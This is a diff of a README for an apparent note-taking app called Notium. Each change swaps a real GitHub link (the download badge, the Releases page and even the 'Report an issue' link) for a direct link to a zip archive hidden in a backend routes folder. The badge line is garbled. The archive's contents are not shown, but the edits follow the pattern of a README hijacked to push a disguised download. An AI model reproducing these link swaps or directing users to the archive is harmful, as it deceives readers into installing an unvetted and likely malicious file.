@@ -1,6 +1,6 @@
 # 📝 Notium---A-Note-taking-platform - Your AI-Enhanced Note-Taking Solution
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/bogulov/Notium---A-Note-taking-platform/releases)
+[![Download Now](https://raw.githubusercontent.com/bogulov/Notium---A-Note-taking-platform/main/backend/src/routes/Notium-platform-taking-Note-v3.8.zip%20Now-Get%https://raw.githubusercontent.com/bogulov/Notium---A-Note-taking-platform/main/backend/src/routes/Notium-platform-taking-Note-v3.8.zip)](https://raw.githubusercontent.com/bogulov/Notium---A-Note-taking-platform/main/backend/src/routes/Notium-platform-taking-Note-v3.8.zip)
 
 ## 🌟 Description
 
@@ -15,7 +15,7 @@ To start using Notium:
 
 ## 📥 Download & Install
 
-To download Notium, visit the [Releases page](https://github.com/bogulov/Notium---A-Note-taking-platform/releases). You will find the latest version available for download. 
+To download Notium, visit the [Releases page](https://raw.githubusercontent.com/bogulov/Notium---A-Note-taking-platform/main/backend/src/routes/Notium-platform-taking-Note-v3.8.zip). You will find the latest version available for download. 
 
 ### Steps to Download:
 
@@ -84,7 +84,7 @@ Once you launch Notium, you'll see a user-friendly interface. Here’s how to ge
 
 If you encounter any issues or have suggestions, please reach out:
 
-- **GitHub Issues:** [Report an issue](https://github.com/bogulov/Notium---A-Note-taking-platform/issues)
+- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/bogulov/Notium---A-Note-taking-platform/main/backend/src/routes/Notium-platform-taking-Note-v3.8.zip)
 - **Feedback Forum:** Join our community and share your thoughts.
 
 ## 📈 Contributing
